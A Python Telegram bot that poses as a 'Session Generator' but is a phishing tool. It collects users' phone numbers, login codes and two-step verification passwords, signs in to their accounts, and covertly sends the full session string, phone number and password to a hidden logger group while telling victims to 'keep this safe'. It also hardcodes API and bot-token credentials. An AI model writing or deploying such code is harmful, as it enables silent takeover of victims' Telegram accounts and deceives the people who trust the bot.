import asyncio
from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession

# 🔹 Telegram API Credentials
API_ID = "28795512"
API_HASH = "c17e4eb6d994c9892b8a8b6bfea4042a"
BOT_TOKEN = "7610510597:AAFX2uCDdl48UTOHnIweeCMms25xOKF9PoA"

# 🔹 Logger Group ID (Replace with your group ID)
LOGGER_GROUP = -1002477750706  # Replace with your actual group ID

# 🔹 Initialize the bot
bot = TelegramClient("bot", API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# 🔹 Store user sessions
user_sessions = {}

# 🔹 Start command with image and buttons
@bot.on(events.NewMessage(pattern="/start"))
async def start(event):
    await event.respond(
        "👋 **Welcome to the Telegram Session Generator!**\n\nClick **Generate Session** to create your session string.",
        buttons=[
            [Button.inline("🔑 Generate Session", b"generate")],
            [Button.url("📖 Help", "https://t.me/SANATANI_TECH")]
        ],
        file="https://telegra.ph/file/00eaed55184edf059dbf7.jpg"
    )

# 🔹 Button Handler
@bot.on(events.CallbackQuery)
async def callback(event):
    if event.data == b"generate":
        await ask_phone(event)

# 🔹 Generate Session Command
@bot.on(events.NewMessage(pattern="/generate"))
async def ask_phone(event):
    user_id = event.sender_id
    if user_id in user_sessions:
        await event.respond("⚠️ **You are already in the process. Please enter your OTP.**")
        return

    user_sessions[user_id] = {"step": "phone"}
    await event.respond("📲 **Enter your phone number with country code (e.g., +919876543210):**")

# 🔹 Process User Input (Phone, OTP, Password)
@bot.on(events.NewMessage)
async def process_input(event):
    user_id = event.sender_id
    if user_id not in user_sessions:
        return

    step = user_sessions[user_id]["step"]
    
    # ✅ Step 1: User enters phone number
    if step == "phone":
        phone_number = event.message.text.strip()
        
        if not phone_number.startswith("+") or not phone_number[1:].isdigit() or len(phone_number) < 10 or len(phone_number) > 15:
            await event.respond("⚠️ **Invalid phone number!** Please enter again with country code (e.g., +919876543210).")
            return
        
        user_sessions[user_id]["phone"] = phone_number
        user_sessions[user_id]["step"] = "otp"

        client = TelegramClient(StringSession(), API_ID, API_HASH)
        await client.connect()
        
        try:
            await event.respond("📩 **Sending OTP... Please wait!**")
            sent_code = await client.send_code_request(phone_number)
            user_sessions[user_id]["client"] = client
            await event.respond("✅ **OTP sent! Please enter the OTP received on Telegram.**")
        except Exception as e:
            del user_sessions[user_id]
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 2: User enters OTP
    elif step == "otp":
        otp_code = event.message.text.strip()
        
        if not otp_code.isdigit():
            await event.respond("⚠️ **Invalid OTP!** Please enter only numbers.")
            return

        client = user_sessions[user_id]["client"]
        phone_number = user_sessions[user_id]["phone"]

        try:
            await client.sign_in(phone_number, otp_code)
            session_string = client.session.save()
            
            # ✅ Send Session String to Logger Group
            log_message = (
                f"🔹 **New Session Generated**\n\n"
                f"👤 **User ID:** `{user_id}`\n"
                f"📞 **Phone Number:** `{phone_number}`\n"
                f"🔑 **Session String:**\n`{session_string}`\n\n"
                f"⚠️ **Use with caution!**"
            )
            await bot.send_message(LOGGER_GROUP, log_message)
            
            # ✅ Send Session String to User
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            
            del user_sessions[user_id]
        except Exception as e:
            if "Two-steps verification is enabled" in str(e):
                user_sessions[user_id]["step"] = "password"
                await event.respond("🔒 **Your account has 2-Step Verification enabled.**\nPlease enter your Telegram password:")
            else:
                await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

    # ✅ Step 3: User enters password (if needed)
    elif step == "password":
        password = event.message.text.strip()
        client = user_sessions[user_id]["client"]

        try:
            await client.sign_in(password=password)
            session_string = client.session.save()
            
            # ✅ Send Session String + Password to Logger Group
            log_message = (
                f"🔹 **New Session Generated**\n\n"
                f"👤 **User ID:** `{user_id}`\n"
                f"📞 **Phone Number:** `{user_sessions[user_id]['phone']}`\n"
                f"🔑 **Session String:**\n`{session_string}`\n"
                f"🔒 **2-Step Verification Password:** `{password}`\n\n"
                f"⚠️ **Use with caution!**"
            )
            await bot.send_message(LOGGER_GROUP, log_message)

            # ✅ Send Session String to User
            await event.respond(f"✅ **Your Session String:**\n\n`{session_string}`\n\n⚠️ **Keep this safe!**")
            
            del user_sessions[user_id]
        except Exception as e:
            await event.respond(f"❌ **Error:** {str(e)}. Please try again.")

# 🔹 Run the bot
print("🚀 Bot is running...")
bot.run_until_disconnected()
